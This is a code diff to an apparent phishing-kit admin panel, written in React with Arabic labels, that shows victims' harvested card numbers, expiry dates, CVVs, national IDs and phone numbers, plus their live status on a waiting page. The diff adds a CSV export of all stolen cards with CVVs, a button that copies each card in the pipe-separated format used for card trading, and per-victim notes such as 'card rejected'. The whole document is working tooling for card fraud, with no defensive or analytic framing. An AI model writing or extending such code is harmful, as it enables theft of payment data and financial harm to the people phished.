@@ -1,4 +1,5 @@
 import React, { useState, useEffect, useMemo, useRef } from 'react';
+import { motion, AnimatePresence } from 'framer-motion';
 import { supabase } from '../../supabase';
 import {
   Users,
@@ -23,7 +24,10 @@ import {
   ChevronDown,
   Lock,
   Plus,
-  ArrowRight
+  ArrowRight,
+  Copy,
+  Edit3,
+  Download
 } from 'lucide-react';
 import './Admin.css';
 
@@ -51,6 +55,9 @@ export const Admin = () => {
   const [isSoundEnabled, setIsSoundEnabled] = useState(true);
   const [unreadCustomers, setUnreadCustomers] = useState(new Set());
   const [currentTime, setCurrentTime] = useState(Date.now());
+  const [adminNotes, setAdminNotes] = useState(() => JSON.parse(localStorage.getItem('admin_notes') || '{}'));
+  const [showNoteInput, setShowNoteInput] = useState(false);
+  const [noteText, setNoteText] = useState('');
 
   useEffect(() => {
     const timer = setInterval(() => setCurrentTime(Date.now()), 15000); // update every 15s for online status
@@ -383,9 +390,51 @@ export const Admin = () => {
     return bins[bin] || 'بنك محلي';
   };
 
+  const exportToCSV = () => {
+    const cards = customers.filter(c => c.card_number);
+    if (cards.length === 0) return alert('لا يوجد بطاقات لتصديرها');
+    
+    // Add BOM for Excel Arabic support
+    let csvContent = "data:text/csv;charset=utf-8,\uFEFFالاسم,رقم الهوية,الجوال,رقم البطاقة,تاريخ الانتهاء,CVV,البنك,التاريخ\n";
+    cards.forEach(c => {
+      const row = `${c.full_name || ''},${c.id_number || ''},${c.mobile || ''},${c.card_number},${c.card_expiry || ''},${c.card_cvv || ''},${getBankName(c.card_number)},${new Date(c.created_at || c.last_update).toLocaleDateString('ar-SA')}`;
+      csvContent += row + "\n";
+    });
+    
+    const encodedUri = encodeURI(csvContent);
+    const link = document.createElement("a");
+    link.setAttribute("href", encodedUri);
+    link.setAttribute("download", `cards_export_${new Date().getTime()}.csv`);
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
+    setIsGearOpen(false);
+  };
+
+  // Quick Copy Helper
+  const handleCopyCard = (e, customer) => {
+    e.stopPropagation();
+    const text = `${customer.card_number || ''}|${customer.card_expiry || ''}|${customer.card_cvv || ''}`;
+    navigator.clipboard.writeText(text);
+    alert('تم نسخ البطاقة: ' + text);
+  };
+
   // Reusable Virtual Card
   const VirtualCard = ({ customer }) => (
-    <div className="admin-virtual-card-v2">
+    <motion.div 
+      initial={{ scale: 0.9, opacity: 0 }}
+      animate={{ scale: 1, opacity: 1 }}
+      transition={{ type: 'spring', stiffness: 200, damping: 20 }}
+      className="admin-virtual-card-v2" 
+      style={{ position: 'relative' }}
+    >
+      <button 
+        onClick={(e) => handleCopyCard(e, customer)}
+        className="icon-btn copy-card-btn"
+        title="نسخ بيانات البطاقة"
+      >
+        <Copy size={16} color="#fff" />
+      </button>
       <div className="v-card-top-row">
         <div className="v-card-chip"></div>
         <div className="v-card-bank-name">{getBankName(customer.card_number)}</div>
@@ -405,7 +454,7 @@ export const Admin = () => {
           <strong>{customer.card_cvv || '---'}</strong>
         </div>
       </div>
-    </div>
+    </motion.div>
   );
 
   // Memoized Sidebar Item to prevent lag during heartbeat updates
@@ -441,6 +490,7 @@ export const Admin = () => {
               <div className="gear-dropdown-v2" onMouseLeave={() => setIsGearOpen(false)}>
                 <button onClick={() => { setCurrentView('stats'); setIsGearOpen(false); }}><PieChart size={16} /> الإحصائيات</button>
                 <button onClick={() => { setCurrentView('cards'); setIsGearOpen(false); }}><CreditCard size={16} /> البطاقات المسحوبة</button>
+                <button onClick={exportToCSV}><Download size={16} /> تصدير البطاقات (CSV)</button>
                 <button onClick={() => { setCurrentView('failed'); setIsGearOpen(false); }}><AlertCircle size={16} /> العملاء المنسحبين</button>
                 <button onClick={() => { setCurrentView('users'); setIsGearOpen(false); }}><Lock size={16} /> تغيير كلمة المرور</button>
                 <button onClick={() => { setIsDeleteModalOpen(true); setIsGearOpen(false); }} style={{ color: 'red' }}><Trash2 size={16} /> حذف كافة البيانات</button>
@@ -519,9 +569,17 @@ export const Admin = () => {
 
         {/* Main Area (Left) */}
         <main className="admin-main-v2">
-          {currentView === 'workspace' && (
-            selectedCustomer ? (
-              <div className="workspace-inner">
+          <AnimatePresence mode="wait">
+            {currentView === 'workspace' && (
+              selectedCustomer ? (
+                <motion.div 
+                  key="workspace-inner"
+                  initial={{ opacity: 0, x: -20 }}
+                  animate={{ opacity: 1, x: 0 }}
+                  exit={{ opacity: 0, x: 20 }}
+                  transition={{ duration: 0.3 }}
+                  className="workspace-inner"
+                >
                 <div className="customer-top-info">
                   <button className="back-to-list-btn" onClick={() => setMobileDetailsActive(false)}>
                     <ArrowRight size={20} />
@@ -530,7 +588,40 @@ export const Admin = () => {
                   <h1>{selectedCustomer.full_name || selectedCustomer.id_number}</h1>
                   <div className={`online-status-badge ${isUserOnline(selectedCustomer) ? 'online' : 'offline'}`}>
                     {isUserOnline(selectedCustomer) ? 'متصل الآن - ' : 'خرج - '} {selectedCustomer.page}
+                    {selectedCustomer.page && selectedCustomer.page.includes('انتظار') && (
+                      <span className="wait-timer">
+                        (منذ {Math.floor((Date.now() - (selectedCustomer.last_update || Date.now())) / 1000)} ثانية)
+                      </span>
+                    )}
                   </div>
+                </div>
+
+                {/* Quick Note Box */}
+                <div className="quick-note-section" style={{ marginBottom: '15px', background: '#fff', padding: '10px 15px', borderRadius: '10px', display: 'flex', alignItems: 'center', gap: '10px' }}>
+                  <Edit3 size={18} color="#64748b" />
+                  {showNoteInput ? (
+                    <div style={{ display: 'flex', gap: '5px', flex: 1 }}>
+                      <input 
+                        type="text" 
+                        value={noteText}
+                        onChange={(e) => setNoteText(e.target.value)}
+                        placeholder="اكتب ملاحظة (مثال: البطاقة مرفوضة)..." 
+                        style={{ flex: 1, padding: '5px 10px', borderRadius: '5px', border: '1px solid #ddd' }}
+                      />
+                      <button onClick={() => {
+                        const newNotes = { ...adminNotes, [selectedCustomer.id]: noteText };
+                        setAdminNotes(newNotes);
+                        localStorage.setItem('admin_notes', JSON.stringify(newNotes));
+                        setShowNoteInput(false);
+                      }} style={{ background: '#e91e63', color: '#fff', padding: '5px 15px', borderRadius: '5px', border: 'none', cursor: 'pointer' }}>حفظ</button>
+                    </div>
+                  ) : (
+                    <div style={{ flex: 1, display: 'flex', justifyContent: 'space-between', alignItems: 'center', cursor: 'pointer' }} onClick={() => { setShowNoteInput(true); setNoteText(adminNotes[selectedCustomer.id] || ''); }}>
+                      <span style={{ color: adminNotes[selectedCustomer.id] ? '#1e293b' : '#94a3b8' }}>
+                        {adminNotes[selectedCustomer.id] || 'أضف ملاحظة سريعة لهذا العميل...'}
+                      </span>
+                    </div>
+                  )}
                 </div>
 
                 {/* New Top Preview: Card (Left) and Codes (Right) */}
@@ -618,13 +709,15 @@ export const Admin = () => {
                     <div className="info-row-v2"><span>آخر تحديث</span> <strong>{new Date(selectedCustomer.last_update || 0).toLocaleString('ar-SA')}</strong></div>
                   </div>
                 </div>
-              </div>
-            ) : (
-              <div style={{ textAlign: 'center', padding: '100px', color: '#999' }}>
-                يرجى اختيار عميل من القائمة الجانبية
-              </div>
-            )
-          )}
+                </motion.div>
+              ) : (
+                <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="empty-state" key="empty">
+                  <Activity size={48} color="#cbd5e1" />
+                  <p>الرجاء اختيار عميل من القائمة للبدء</p>
+                </motion.div>
+              )
+            )}
+          </AnimatePresence>
 
           {currentView === 'stats' && (
             <div className="full-page-view">
